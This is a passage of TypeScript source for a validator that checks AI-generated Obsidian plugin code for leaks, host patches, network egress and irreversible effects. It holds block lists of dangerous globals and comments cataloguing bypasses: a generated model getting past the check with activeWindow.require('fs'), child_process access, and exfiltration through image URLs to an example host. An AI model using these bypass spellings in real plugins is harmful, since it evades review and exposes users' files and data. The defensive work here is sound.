/**
 * The generated-code validator — modkit's one structural advantage over the ecosystem it is joining.
 *
 * Obsidian's `Component` contract is what makes a mod safely removable, and Obsidian can only
 * *document* it: a plugin that calls `document.addEventListener` directly still leaks. modkit's
 * author is a compiler, so modkit can enforce it. Everything below is that enforcement.
 *
 * ## Why a parser and not regexes
 *
 * Every rule here is structural — *"an `around()` call not lexically inside `this.register(...)`"*,
 * *"an assignment whose left-hand receiver came from the host"*, *"an identifier that resolves to no
 * local binding"*. A regex banning `addEventListener` fires on the word in a comment, misses
 * `el["add" + "EventListener"]`, and — worse — has no way to *permit* the sanctioned
 * `this.registerDomEvent(document, …)`, so it either blocks correct code or lets the leak through.
 * `acorn` + `acorn-walk` are MIT, dependency-free, and are the parser under eslint and rollup.
 *
 * ## What gets validated, and when
 *
 * **The pre-bundle source, never the bundle.** Bundling inlines `monkey-around`, whose own internals
 * trip half these rules. Validate what the model produced; bundle only after it passes.
 *
 * **Plain JavaScript, not TypeScript.** acorn then parses the exact text the model wrote, so every
 * reported line and column is *true*. Validating a TypeScript source means validating the output of
 * a transform, and every location in the report becomes a lie. If a caller ever does validate
 * transformed text, `excerpt` is what keeps the finding legible.
 *
 * ## The fail-open hole in the recon validator, and how this one closes it
 *
 * The version of this validator written during recon used `inRegister = ancestors.some(isRegisterCall)`
 * — an **ancestor** test. That whitelists the entire subtree of `this.register(anythingAtAll())`, so
 * `this.register((() => { document.addEventListener("click", leak); setInterval(spin, 10); })())`
 * passed clean. Everything else in that validator failed closed; this one rule failed open.
 *
 * It is closed here by replacing the ancestor test with **sanctioned acquisition sites**: specific
 * node identities, computed up front, that name the exact sub-expression each `register*` form is
 * allowed to cover.
 *
 *   - `this.registerDomEvent(el, type, fn)` sanctions **argument 0 only** — the element expression.
 *     The handler body gets no exemption, because a handler is ordinary code.
 *   - `this.registerInterval(window.setInterval(fn, ms))` sanctions **the `window` identifier that is
 *     the callee's object**, and nothing else. Not the callback, not the delay expression.
 *   - `this.register(around(holder, {...}))` sanctions the `around()` call itself, through at most
 *     one wrapping call (so `this.register(guard(around(...)))` — the template's try/catch wrapper —
 *     is accepted while `this.register(sneaky(() => around(...)))` is not).
 *
 * The remaining looseness is deliberate and fails *closed*: an unusual-but-correct acquisition is
 * rejected and has to be written the template's way. That is the right direction for a rule whose
 * whole job is to make a class of silent failure impossible.
 *
 * ────────────────────────────────────────────────────────────────────────────────────────────────
 *
 * # The binding lattice — the 2026-08-31 provenance restructure
 *
 * ## Why the flat name maps had to go
 *
 * Every rule here that protects the host used to ask a question about a **name**: is this identifier
 * in `hostBindings`, is this holder called `Object`, is this the string `"around"`. Provenance was
 * built from exactly two shapes — `const <Identifier> = <expr>` declarators, and the parameters of
 * directly-called named functions — so *any other spelling of the same dataflow* was invisible.
 * Nine of them were reproduced against the hardened build, each returning **zero findings**, each a
 * permanent uninstallable patch of a plugin the user runs:
 *
 * ```
 *   const { prototype } = target.constructor;   prototype.getTasks   = fn   // destructuring
 *   const { workspace } = this.app;             workspace.getLeaf    = fn   // destructuring
 *   const me = this;                            me.app.workspace.getLeaf = fn  // this-alias
 *   this.h = target.constructor.prototype;      this.h.getTasks      = fn   // a field on `this`
 *   const holderOf = () => …prototype;          holderOf().getTasks  = fn   // a return value
 *   const boxes = [proto];                      boxes[0].getTasks    = fn   // an array member
 *   const bag = new Map(); bag.set("h", proto); bag.get("h").getTasks = fn  // a Map round-trip
 *   const h = await Promise.resolve(proto);     h.getTasks           = fn   // an await
 *   [proto].forEach((h) => { h.getTasks = fn })                             // a callback parameter
 * ```
 *
 * Closing them one by one is how you get a tenth. They are closed here by *changing the question*:
 * every host-protecting rule now asks the lattice below, and the lattice is computed by abstract
 * interpretation over real, scope-correct bindings.
 *
 * ## The lattice
 *
 * A binding — and, by evaluation, every expression — carries one of four values:
 *
 * | value     | meaning                                                                        |
 * |-----------|--------------------------------------------------------------------------------|
 * | `static`  | a literal, or a fold of literals. Cannot be an object the host owns.            |
 * | `owned`   | the mod made it: `this.<field>` on the mod's own object, `createElement`, `new` |
 * | `unknown` | the flow could not be modelled                                                  |
 * | `host`    | reaches the app graph, the `obsidian` module, the user's document, or a         |
 * |           | prototype derived from any of those                                             |
 *
 * They are ordered `static < owned < unknown < host` and combined with `join` (= max), so a value
 * that could be several things takes the most dangerous of them.
 *
 * ## ⚠️ UNKNOWN IS TREATED AS HOST. EVERY RULE FAILS CLOSED ON IT.
 *
 * {@link isHostish} is `host || unknown`, and that single decision is the whole point of the
 * restructure. A rule that asks "is this a name I know to be foreign?" is defeated by the *next*
 * spelling, forever; a rule that asks "have I established that this is the mod's own?" is defeated
 * by nothing, because a spelling the analysis cannot follow resolves to `unknown` and is refused.
 * When a flow cannot be modelled precisely it resolves to `unknown` — **never** silently to `owned`.
 *
 * The cost is real and is the correct cost: a mod that reaches its holder through machinery this
 * file cannot follow is *rejected*, and the correction turn tells it to bind the holder in one
 * expression from `this.app…`. The messages say so, because "provenance could not be established"
 * is an actionable finding and "no findings" on a permanent prototype patch is not.
 *
 * ## What flows
 *
 * Destructuring (object and array patterns, nested, with defaults and rest); `this.<field>` written
 * anywhere in a class and read anywhere else; function **return** values (declarations, expressions,
 * arrows, concise bodies); parameters bound from every resolvable call site; array and object
 * literal members; `Map`/`Set`/array writes (`set`/`add`/`push`/`unshift`/`splice`, and `x[k] = v`)
 * flowing back into the collection binding; `await`; and callback parameters for the iteration and
 * promise methods. Everything else lands on `unknown`.
 *
 * Resolution is **scope-correct**: a real scope chain, so a helper parameter that happens to reuse
 * an outer name is that parameter and not the outer binding. The previous pass left this explicitly
 * unfixed and called it "the conservative direction"; it is not conservative in the direction that
 * matters, because it also made an *inner* binding inherit an outer name's host-ness and back.
 *
 * ## Consequence, not ceremony
 *
 * Two refusal rules used to be satisfied by taking a measurement and throwing it away — a
 * `getOwnPropertyDescriptor` on the right holder whose result is never tested, and a host-rooted
 * `.version` read never compared to anything. Both are now bound to their *consequence* by a small
 * value-flow graph: the descriptor must reach a binding whose `.get`/`.set` is tested, and the
 * version must reach a **range** comparison (not a null check) whose failure path returns. A mod can
 * no longer install on a getter-only member, do nothing, and report `applied`.
 *
 * ## Two false rejections closed in the same pass
 *
 * A false rejection is a real defect: it burns a generation on the retry loop and teaches everyone
 * downstream to trust the only safety mechanism less. `const LIMITS = Object.freeze({ max: 10 })` is
 * inert and is now legal at module scope; `contentEl.addClass(…)` inside a `Modal`'s `onOpen()` is
 * the canonical Obsidian idiom and is now legal, because the validator knows which classes extend a
 * host-managed Obsidian view and that Obsidian empties `contentEl` on close.
 *
 * ────────────────────────────────────────────────────────────────────────────────────────────────
 *
 * # The effects axis — the 2026-08-31 second pass
 *
 * Round 5 was the turning point, and not because the lattice failed. Two independent adversaries
 * confirmed it holds: 158 of 159 prior fixtures caught, every provenance-laundering shape refused
 * (Proxy, getter, default parameter, IIFE, `.bind`/`.call`, generator, `Map` round-trip, `WeakRef`,
 * class static, throw/catch, `forEach` parameter), zero false rejections on the eighteen must-pass
 * forms. *"It will permanently patch a plugin he uses with no uninstaller is now FALSE. I could not
 * make that happen."*
 *
 * What they found instead was a **second axis this file had never modelled**, named exactly:
 *
 * > The reclaim contract asks: can Obsidian take this patch back. Every finding below is a mod whose
 * > patch IS perfectly removable and whose EFFECTS are not. Disabling the mod does not un-rewrite a
 * > note, un-trash a file, un-disable Dataview, un-send a POST, or un-run `child_process`.
 *
 * A 176-line mod that rewrote every markdown file in the vault validated clean, because `vault` and
 * `adapter` appeared nowhere in these 4,000 lines except prose. So did one that trashed files, one
 * that renamed them, one that disabled Dataview, one that POSTed the whole vault to a remote
 * endpoint, one that emptied Obsidian's sidebar (through `empty()`, which is in
 * {@link TEARDOWN_CALLS}, so it read as a *reclaim*).
 *
 * ## Why these are DECLARED and not banned
 *
 * A mod may legitimately want to write a file — that is a thing users ask for. A ban on
 * `vault.modify` is routed around on the correction turn and all it teaches is laundering; the
 * control that actually holds is a line a human reads before installing, because it does not compete
 * with the model at all. {@link collectEffects} therefore emits {@link EffectDeclaration}s on
 * {@link EffectsReport.effects}, with a severity of their own (`'declaration'`) so nothing can ever
 * mistake one for a finding and block on it. The daemon passes them through; the review gate leads
 * with them.
 *
 * The measurement that says the list is worth reading: of twenty-five real mods that validated at
 * zero findings while doing permanent damage, twenty-four now declare an effect — and the canonical
 * *correct* mod (an owned `<style>`, appended and registered for removal) declares none.
 *
 * ## The last lattice cell, closed in the same pass
 *
 * One cell of the lattice did still fail open, and it is the shape worth remembering: a call to a
 * `#private` method on `this` **inherited its receiver's provenance instead of degrading**, because
 * {@link propertyName} returned `null` for a `PrivateIdentifier` and every caller reads `null` as
 * "not statically nameable". `this` is `owned`, so a private helper returning
 * `target.constructor.prototype` handed back an *owned* host prototype, and a complete,
 * contract-conformant mod validated at zero findings while permanently stubbing a method on a plugin
 * the user runs. Both halves are fixed: private names resolve, and — the general rule — **a call is
 * not its receiver**, so any unresolvable call on an `owned` receiver degrades to `unknown`.
 *
 * ## And the mod that never stops
 *
 * `async onload() { while (true) { await Promise.resolve(); … } }` is the accident, not the attack:
 * no handle to unload, `unload()` never gets a turn, and because the mod stays *enabled*, relaunching
 * Obsidian hangs it again — recovery means editing `community-plugins.json` from outside the app.
 * See {@link checkLiveness}.
 */

import * as acorn from 'acorn';
import * as walk from 'acorn-walk';

import type {
  ReachPlaneId,
  ValidationFinding,
  ValidationReport,
  ValidationRuleId,
  ValidationSeverity,
} from '@modkit/types';

/**
 * A rule id. `ValidationRuleId` is the published union; the string half is deliberate and is
 * documented on `ValidationFinding.rule` — the daemon may add a rule without a protocol bump. The
 * reclaim-contract rules added in the hardening pass use it.
 */
type RuleId = ValidationRuleId | (string & {});

/* ────────────────────────────────────────────────────────────────────────────
 * Policy tables
 * ──────────────────────────────────────────────────────────────────────────── */

/**
 * Globals a generated mod may not read.
 *
 * `window` and `document` are on the list even though the sanctioned forms need them, because the
 * sanctioned forms are recognised by *node identity* below rather than by name. `activeDocument`
 * and `activeWindow` are deliberately **absent**: they are documented Obsidian globals and they are
 * the popout-window-correct ones, so a plane-E mod has a legal way to touch the DOM.
 */
export const BANNED_GLOBALS: ReadonlySet<string> = new Set([
  'document',
  'window',
  'globalThis',
  'global',
  'process',
  'require',
  'module',
  'exports',
  '__dirname',
  '__filename',
  'localStorage',
  'sessionStorage',
  'indexedDB',
  'fetch',
  'XMLHttpRequest',
  'eval',
  'Function',
  'WebSocket',
  'Worker',
  'SharedWorker',
  'importScripts',
  'setTimeout',
  'setInterval',
  'setImmediate',
  'requestAnimationFrame',
  'requestIdleCallback',
  'queueMicrotask',
  'addEventListener',
  'removeEventListener',
  'electron',
  'app',
  'Buffer',
  // ── the browser globals that were on no list at all until 2026-08-31 ──
  // `navigator.sendBeacon(url, body)` is unbounded network egress in one call, with no response to
  // wait for and nothing to reclaim; it validated with zero findings. `location`/`history`/`open`
  // navigate or spawn windows out from under Obsidian; `top`/`parent`/`opener`/`frames`/`self` are
  // the window under another name, and were each a free re-entry to everything above.
  'navigator',
  'location',
  'history',
  'top',
  'parent',
  'opener',
  'frames',
  'self',
  'screen',
  'caches',
  'open',
  'close',
  'alert',
  'confirm',
  'prompt',
  'print',
  'postMessage',
]);

/**
 * The subset of {@link BANNED_GLOBALS} that is *also* banned as a **member** of a host window.
 *
 * ⚠️ `BANNED_GLOBALS` was a bare-identifier rule, and every entry on it is reachable as a member of
 * the two globals the prompt *tells* the model to use: `const fs = activeWindow.require("fs")` and
 * `const cp = activeWindow.require("child_process")` gave a generated plugin the whole node
 * filesystem and arbitrary process execution at **zero findings**, while the bare `require("fs")`
 * control was blocked — and the rejection message named `activeWindow` as the remedy, so the
 * correction turn was handed the working spelling. The member form is the bare form.
 *
 * The names handled by a *more specific* rule are deliberately absent, so a leak is reported once
 * with the message that names its real remedy: the timers belong to {@link RAW_TIMER_CALLS},
 * `addEventListener`/`removeEventListener` to `no-raw-listener`, `eval`/`Function`/`importScripts`
 * to `no-eval`, and `Worker`/`SharedWorker`/`WebSocket` to `no-eval` and
 * {@link RECLAIMABLE_CONSTRUCTORS}. `document`/`window`/`globalThis` are absent for a different
 * reason: they are {@link HOST_GLOBAL_ROOTS}, so reaching one hands back a host value and the
 * lattice already refuses every write through it.
 */
const MEMBER_BANNED_GLOBALS: ReadonlySet<string> = new Set([
  'require',
  'process',
  'module',
  'exports',
  '__dirname',
  '__filename',
  'localStorage',
  'sessionStorage',
  'indexedDB',
  'fetch',
  'XMLHttpRequest',
  'electron',
  'app',
  'Buffer',
  'navigator',
  'location',
  'history',
  'top',
  'parent',
  'opener',
  'frames',
  'caches',
  'open',
  'alert',
  'confirm',
  'prompt',
  'print',
  'postMessage',
]);

/**
 * The remedy each banned global actually has, so the rejection does not hand the model a working
 * bypass.
 *
 * ⚠️ The message used to end `use requestUrl/Notice from "obsidian", activeDocument/activeWindow, …`
 * for *every* name on the list — including `require`, `process`, `fetch` and `localStorage`, none of
 * which have anything to do with the DOM. A model told that `require("fs")` is refused and that
 * `activeWindow` is the sanctioned spelling writes `activeWindow.require("fs")` on the correction
 * turn, which is exactly what happened. A remedy that is not a remedy is worse than none.
 */
const GLOBAL_REMEDIES: ReadonlyMap<string, string> = new Map([
  ['require', 'a mod has no filesystem and no child processes — it reaches the vault through this.app.vault and the network through requestUrl from "obsidian"'],
  ['process', 'a mod has no process and no environment — Obsidian mobile has no node at all'],
  ['module', 'a mod has no CommonJS module object — it is an ES module, and its dependencies are fixed at build time'],
  ['exports', 'a mod has no CommonJS exports — it is an ES module with exactly one default export'],
  ['__dirname', 'a mod has no filesystem paths — vault paths go through this.app.vault'],
  ['__filename', 'a mod has no filesystem paths — vault paths go through this.app.vault'],
  ['localStorage', "keep the mod's own state on `this`, and persist it with this.saveData()/this.loadData(), which Obsidian scopes to the mod and removes with it"],
  ['sessionStorage', "keep the mod's own state on `this`, and persist it with this.saveData()/this.loadData()"],
  ['indexedDB', "keep the mod's own state on `this`, and persist it with this.saveData()/this.loadData()"],
  ['fetch', 'use requestUrl from "obsidian", which respects the user\'s proxy settings and works on mobile'],
  ['XMLHttpRequest', 'use requestUrl from "obsidian"'],
  ['navigator', 'use requestUrl from "obsidian" for the network and Platform from "obsidian" for what the app is running on'],
  ['location', 'a mod never navigates the app — use this.app.workspace to open a leaf'],
  ['history', 'a mod never rewrites the app\'s history — use this.app.workspace to open a leaf'],
  ['open', 'a mod does not open windows — Obsidian\'s own link handling opens external URLs'],
  ['alert', 'use Notice from "obsidian"'],
  ['confirm', 'use Modal from "obsidian"'],
  ['prompt', 'use Modal from "obsidian"'],
  ['print', 'a mod does not drive the print dialog'],
  ['postMessage', 'a mod does not talk to other frames'],
  ['electron', 'a mod has no access to Electron — it runs the same on desktop and on mobile'],
  ['app', 'use `this.app`, the App the mod was handed'],
  ['Buffer', 'a mod has no node globals — use ArrayBuffer/Uint8Array'],
  ['top', 'a mod does not reach out of its window — use activeWindow/activeDocument for the popout-correct DOM'],
  ['parent', 'a mod does not reach out of its window — use activeWindow/activeDocument for the popout-correct DOM'],
  ['opener', 'a mod does not reach out of its window'],
  ['frames', 'a mod does not reach out of its window'],
  ['self', 'use activeWindow, which is the popout-correct window'],
  ['screen', 'use Platform from "obsidian" for what the app is running on'],
  ['caches', "keep the mod's own state on `this`, and persist it with this.saveData()/this.loadData()"],
]);

/** The `Component` acquisition methods. Everything a mod takes hold of goes through one of these. */
export const REGISTER_METHODS: ReadonlySet<string> = new Set([
  'register',
  'registerEvent',
  'registerDomEvent',
  'registerInterval',
  'addChild',
]);

/**
 * The only two specifiers a generated mod may import.
 *
 * This is also what makes esbuild's `resolveDir` sandbox meaningful: the build resolves from
 * `templates/patch/`, and this list is the allowlist that directory stands for.
 */
export const ALLOWED_IMPORTS: readonly string[] = ['obsidian', 'monkey-around'];

/**
 * Undocumented members of the `app` graph. `obsidian.d.ts` declares `App` with `keymap, scope,
 * workspace, vault, metadataCache, fileManager, lastEvent, renderContext, secretStorage` — none of
 * these. Every hop from one of them onward must be optional-chained, and a missing hop must be a
 * refusal path rather than a throw.
 */
export const INTERNAL_MEMBERS: ReadonlySet<string> = new Set([
  'plugins',
  'internalPlugins',
  'manifests',
  'enabledPlugins',
  'commands',
  'viewRegistry',
  'setting',
  'hotkeyManager',
]);

/**
 * Globals that *are* the host, for provenance purposes.
 *
 * These are not banned reads (`activeDocument`/`activeWindow` are the documented, popout-correct
 * way to touch the DOM), but everything reached *through* one of them belongs to Obsidian and to
 * the user's document, not to the mod.
 */
const HOST_GLOBAL_ROOTS: ReadonlySet<string> = new Set([
  'activeDocument',
  'activeWindow',
  'document',
  'window',
  'globalThis',
  // Each of these *is* the window or the user's session under another name. They are banned reads as
  // well (see BANNED_GLOBALS), but provenance still has to be right: a mod that binds one before the
  // ban is applied must not end up holding an `owned` value.
  'navigator',
  'location',
  'history',
  'top',
  'parent',
  'opener',
  'frames',
  'self',
  'screen',
  'caches',
]);

/**
 * Globals that carry no host identity: reading one, or calling through one, cannot hand back an
 * object the host owns *unless one of the arguments already was one* — which the call rule in
 * {@link Analysis.provOf} handles by joining the arguments in.
 *
 * Without this list every one of them would be `unknown`, and `unknown` is `host`. `Object.keys(x)`
 * would be a host object, `String(v).split(".")` would be a host object, and the validator would
 * reject its own template. The list is what keeps fail-closed from meaning fail-always.
 */
const INERT_GLOBALS: ReadonlySet<string> = new Set([
  'Object',
  'Reflect',
  'Array',
  'Map',
  'Set',
  'WeakMap',
  'WeakSet',
  'Promise',
  'JSON',
  'Math',
  'String',
  'Number',
  'Boolean',
  'Symbol',
  'BigInt',
  'Date',
  'RegExp',
  'Error',
  'TypeError',
  'RangeError',
  'Proxy',
  'Intl',
  'console',
  'isNaN',
  'isFinite',
  'parseInt',
  'parseFloat',
  'undefined',
  'NaN',
  'Infinity',
  'structuredClone',
  // `crypto.randomUUID()` and `performance.now()` hand back a string and a number. They are on no
  // list at all otherwise, which would make them `unknown` — and `unknown` is `host`, so an id
  // generated for the mod's own bookkeeping would poison everything it touched.
  'crypto',
  'performance',
  'MutationObserver',
  'ResizeObserver',
  'IntersectionObserver',
  'PerformanceObserver',
  'EventSource',
  'AbortController',
  'URL',
  'TextEncoder',
  'TextDecoder',
  'ArrayBuffer',
  'Uint8Array',
]);

/**
 * Members that hand back *another* window or document, so the member-global ban follows them.
 *
 * Also the members that let an **owned** node reach back into the host tree —
 * `myDiv.parentElement` is Obsidian's element the moment the div is appended — which is why
 * {@link Analysis.provOf} degrades a read of one of these rather than inheriting.
 */
const HOST_WINDOW_HOPS: ReadonlySet<string> = new Set([
  'window',
  'defaultView',
  'contentWindow',
  'ownerDocument',
  'document',
  'parent',
  'top',
  'opener',
  'self',
  'frames',
]);

/**
 * Reads that escape *upward*, out of whatever the mod owns and into the host's tree.
 *
 * `const el = activeDocument.createElement("div")` is genuinely owned, and the moment it is appended
 * `el.parentElement` is Obsidian's. A property read used to inherit its object's provenance
 * unconditionally, so every one of these came back `owned`.
 */
const ESCAPING_MEMBERS: ReadonlySet<string> = new Set([
  ...HOST_WINDOW_HOPS,
  'parentNode',
  'parentElement',
  'offsetParent',
  'host',
  'shadowRoot',
  'documentElement',
  'body',
  'head',
  'activeElement',
  'nextSibling',
  'previousSibling',
  'nextElementSibling',
  'previousElementSibling',
]);

/** Calls whose result is a primitive whatever went in — the bottom of the lattice, always. */
const PRIMITIVE_COERCERS: ReadonlySet<string> = new Set([
  'String',
  'Number',
  'Boolean',
  'parseInt',
  'parseFloat',
  'isNaN',
  'isFinite',
]);

/**
 * `Object.*` calls that only ever hand back a fold of what they were given, so a `const` bound to
 * one at module scope runs nothing. `Object.freeze({ max: 10 })` is the shape a model reaches for
 * constantly and `no-top-level-side-effects` used to reject it — a false rejection that costs a
 * whole generation.
 */
const INERT_OBJECT_CALLS: ReadonlySet<string> = new Set(['freeze', 'seal', 'create']);

/**
 * Factories whose result the mod **owns**.
 *
 * This is the one carve-out in host provenance and it is load-bearing: without it every plane-E mod
 * is rejected, because `activeDocument.createElement("style")` is reached through a host global and
 * yet the element is entirely the mod's. The mod owns what it created; it owns nothing it found.
 */
const OWNING_FACTORIES: ReadonlySet<string> = new Set([
  'createElement',
  'createElementNS',
  'createTextNode',
  'createDocumentFragment',
  'createEl',
  'createDiv',
  'createSpan',
  'createSvg',
  'createFragment',
  'cloneNode',
]);

/**
 * The subset of {@link OWNING_FACTORIES} that **also inserts** the node it builds into its receiver.
 *
 * Obsidian's `createEl`/`createDiv`/`createSpan`/`createSvg` are `createElement` *and* `appendChild`
 * in one call, and that second half is invisible to a rule that only reads the method name. So
 * `activeDocument.head.createEl("style", { text: … })` is a permanent CSS injection into the user's
 * document — reproduced at zero findings on 2026-08-31, by both adversaries, and flagged by both as
 * the single most likely bypass for an honest model to write, because `createEl` is *the* Obsidian
 * idiom. The element it returns is still the mod's (the provenance rule is right); what it needs is
 * the same reclaim obligation `appendChild` carries.
 *
 * `createElement`/`createElementNS`/`createTextNode`/`createDocumentFragment`/`cloneNode` are
 * deliberately absent: those build a detached node and insert nothing.
 */
const INSERTING_FACTORIES: ReadonlySet<string> = new Set([
  'createEl',
  'createDiv',
  'createSpan',
  'createSvg',
]);

/**
 * Calls that write to their first argument without an `AssignmentExpression` anywhere in the tree.
 * `no-host-assignment` looked only at assignments, so every one of these was a free bypass.
 */
const MUTATOR_CALLS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  ['Object', new Set(['assign', 'defineProperty', 'defineProperties', 'setPrototypeOf'])],
  ['Reflect', new Set(['set', 'defineProperty', 'deleteProperty', 'setPrototypeOf'])],
]);

/**
 * Methods that push a value *into* a collection. The collection's binding takes the join of what was
 * put in it, which is what makes `const bag = new Map(); bag.set("h", hostProto); bag.get("h")` a
 * host expression instead of an `owned` one.
 */
const COLLECTION_WRITERS: ReadonlySet<string> = new Set([
  'set',
  'add',
  'push',
  'unshift',
  'splice',
  'fill',
  'concat',
]);

/**
 * Methods that hand each element of their receiver to a callback. The callback's first parameter
 * takes the receiver's provenance, so `[hostProto].forEach((h) => { h.m = fn })` is a host write.
 */
const CALLBACK_METHODS: ReadonlySet<string> = new Set([
  'forEach',
  'map',
  'filter',
  'find',
  'findLast',
  'findIndex',
  'some',
  'every',
  'flatMap',
  'sort',
  'then',
]);

/**
 * Every way of arming a callback that fires later and is not reclaimed at unload.
 *
 * `requestAnimationFrame` / `requestIdleCallback` were on {@link BANNED_GLOBALS} as *bare* names and
 * nowhere else, so `activeWindow.requestAnimationFrame(loop)` — a self-rescheduling frame loop that
 * outlives the mod forever — validated with zero findings on 2026-08-31. There is no sanctioned
 * `register*` form for either, which is the correct outcome: a mod that needs a repeating callback
 * writes `this.registerInterval(window.setInterval(fn, ms))`.
 */
const RAW_TIMER_CALLS: ReadonlySet<string> = new Set([
  'setTimeout',
  'setInterval',
  'setImmediate',
  'requestAnimationFrame',
  'requestIdleCallback',
  // `queueMicrotask` was on BANNED_GLOBALS as a bare name and nowhere else, so
  // `activeWindow.queueMicrotask(loop)` — a self-rescheduling microtask loop that never yields to
  // the event loop at all — validated with zero findings. A microtask pump is worse than an
  // interval: it starves the renderer rather than merely outliving the mod.
  'queueMicrotask',
]);

/** Constructors that take hold of something the `Component` contract has to give back. */
const RECLAIMABLE_CONSTRUCTORS: ReadonlyMap<string, string> = new Map([
  ['MutationObserver', 'disconnect'],
  ['ResizeObserver', 'disconnect'],
  ['IntersectionObserver', 'disconnect'],
  ['PerformanceObserver', 'disconnect'],
  ['EventSource', 'close'],
  // ⚠️ A socket is the reclaim contract's own core promise, broken: `new activeWindow.WebSocket(…)`
  // holds an open connection to a third party for the life of the process, and it validated with
  // zero findings because the *bare* name was banned and the member form was not on any list.
  ['WebSocket', 'close'],
  ['Worker', 'terminate'],
  ['SharedWorker', 'terminate'],
]);

/* ────────────────────────────────────────────────────────────────────────────
 * The effects axis
 *
 * Everything above asks Obsidian's question: *can this patch be taken back?* The binding lattice
 * answers it, and both adversaries confirmed in round 5 that it holds. What they found instead was a
 * second axis nothing here modelled — a mod whose **patch** is perfectly removable and whose
 * **effects** are not. Disabling the mod does not un-rewrite a note, un-trash a file, un-disable
 * Dataview, un-send a POST, or put back a sidebar it emptied.
 *
 * These are **declared, not banned**, and the distinction is the whole design. A mod may
 * legitimately want to write a file — that is a thing users ask for. A ban on `vault.modify` gets
 * routed around by the next generation and teaches the model to launder its writes; a declaration
 * the human reads before installing is the control that actually holds, because it does not compete
 * with the model at all. So the tables below feed {@link EffectDeclaration}s on the result, with a
 * severity of their own that blocks nothing.
 * ──────────────────────────────────────────────────────────────────────────── */

/** How an effect is classified for the review gate. */
export type EffectKind =
  | 'vault-write'
  | 'editor-write'
  | 'target-plugin-settings'
  | 'target-plugin-lifecycle'
  | 'plugin-enablement'
  | 'network-egress'
  | 'host-dom-destruction'
  | 'host-config-write'
  | 'host-state-mutation';

/**
 * One thing the mod will do to something that is not itself, and that unloading the mod does not
 * undo.
 *
 * `severity` is deliberately *not* a {@link ValidationSeverity}: a declaration is neither an error
 * nor a warning about the code, it is a statement of what the code does, and a caller that filters
 * on `'error'` must never see one. The daemon passes these through and the review gate leads with
 * them.
 */
export interface EffectDeclaration {
  severity: 'declaration';
  kind: EffectKind;
  /** The call, as written: `this.app.vault.modify(...)`. Stable enough to group on. */
  call: string;
  /** What it acts on, canonically, when the path is nameable: `this.app.vault`. */
  subject: string | null;
  /** One line, plain, addressed to the person deciding whether to install this. */
  summary: string;
  /** Whether unloading the mod undoes it. Always `false` here — that is why it is declared. */
  reversedOnUnload: false;
  line: number;
  column: number;
  excerpt?: string;
  file: string;
}

/** The validator's whole answer once the effects axis is included. */
export interface EffectsReport extends ValidationReport {
  effects: EffectDeclaration[];
}

/**
 * Methods on `app.vault`, `vault.adapter` and `app.fileManager` that change the user's files.
 *
 * Reads are absent on purpose: `read`/`cachedRead`/`getMarkdownFiles` tell the user nothing they
 * need to decide with, and a declaration list nobody reads is worth exactly as much as no list.
 */
const VAULT_WRITE_METHODS: ReadonlyMap<string, string> = new Map([
  ['create', 'creates a new file in the vault'],
  ['createBinary', 'creates a new binary file in the vault'],
  ['createFolder', 'creates a folder in the vault'],
  ['modify', 'rewrites the contents of a note in place'],
  ['modifyBinary', 'rewrites a binary file in place'],
  ['process', 'rewrites the contents of a note in place'],
  ['append', 'appends to a note'],
  ['delete', 'deletes a file from the vault'],
  ['trash', 'moves a file to the trash'],
  ['trashLocal', 'moves a file to the vault-local trash'],
  ['trashSystem', 'moves a file to the system trash'],
  ['trashFile', 'moves a file to the trash'],
  ['rename', "renames a file — every wikilink pointing at it is rewritten too"],
  ['renameFile', "renames a file — every wikilink pointing at it is rewritten too"],
  ['copy', 'copies a file inside the vault'],
  ['write', 'writes a file through the raw filesystem adapter'],
  ['writeBinary', 'writes a binary file through the raw filesystem adapter'],
  ['mkdir', 'creates a directory through the raw filesystem adapter'],
  ['rmdir', 'removes a directory through the raw filesystem adapter'],
  ['remove', 'deletes a file through the raw filesystem adapter'],
]);

/** The API surfaces those methods have to be called *on* before they mean any of that. */
const VAULT_RECEIVERS: ReadonlySet<string> = new Set(['vault', 'adapter', 'fileManager']);

/** Editor writes — the user's open note, changed under the cursor. */
const EDITOR_WRITE_METHODS: ReadonlyMap<string, string> = new Map([
  ['setValue', "replaces the entire contents of the note the user has open"],
  ['replaceRange', 'edits the note the user has open'],
  ['replaceSelection', "replaces the user's selection"],
  ['setLine', 'rewrites a line of the note the user has open'],
  ['transaction', 'edits the note the user has open'],
  ['insertText', 'types into the note the user has open'],
]);

/** Writes to the **target** plugin's own persisted `data.json`, which outlives uninstalling the mod. */
const FOREIGN_PERSIST_METHODS: ReadonlyMap<string, string> = new Map([
  ['saveSettings', "writes the target plugin's own settings file"],
  ['saveData', "writes the target plugin's own data.json"],
]);

/**
 * Driving another plugin's own lifecycle by hand.
 *
 * `await target.onunload?.(); await target.onload?.();` — "reload the plugin so my settings take" —
 * double-loads it: every registration it made now exists twice, for the rest of the session, and
 * nothing the mod does at unload undoes that. `index.reset()` throws away a persisted cache.
 */
const FOREIGN_LIFECYCLE_METHODS: ReadonlyMap<string, string> = new Map([
  ['onload', 'loads the target plugin again — every registration it made now exists twice'],
  ['load', 'loads the target plugin again — every registration it made now exists twice'],
  ['onunload', 'unloads the target plugin under the user'],
  ['unload', 'unloads the target plugin under the user'],
  ['reset', "throws away the target plugin's cached state"],
  ['reinitialize', "rebuilds the target plugin's cached state"],
]);

/** Turning other plugins on and off — persisted in the vault's community-plugins.json. */
const PLUGIN_ENABLEMENT_METHODS: ReadonlyMap<string, string> = new Map([
  ['enablePlugin', 'enables another plugin'],
  ['disablePlugin', 'disables another plugin'],
  ['enablePluginAndSave', 'enables another plugin and persists it'],
  ['disablePluginAndSave', 'disables another plugin and persists it'],
  ['enable', 'enables a core plugin'],
  ['disable', 'disables a core plugin'],
  ['uninstallPlugin', 'uninstalls another plugin'],
]);

/** Host configuration the mod rewrites for the whole vault. */
const HOST_CONFIG_METHODS: ReadonlyMap<string, string> = new Map([
  ['setConfig', "changes Obsidian's own vault configuration"],
  ['setHotkeys', "rewrites the vault's hotkey configuration"],
  ['removeHotkeys', "rewrites the vault's hotkey configuration"],
  ['saveLocalStorage', 'writes persistent local storage'],
  ['setUserIgnoreFilters', "changes the vault's ignore filters"],
  ['detachLeavesOfType', "closes the user's open panes — the layout is saved, so it persists"],
  ['setActiveLeaf', "changes which pane the user is looking at"],
]);

/**
 * The DOM's own loaders — egress that never touches a network *API*.
 *
 * ⚠️ Found in round 6, and it is the one that inverts the incentive. `requestUrl(...)` is the
 * sanctioned door and it declares `network-egress`; `img.src = "https://c.example.com/p?v=" + data`
 * does the identical GET, with the identical payload, through an element the mod created — an
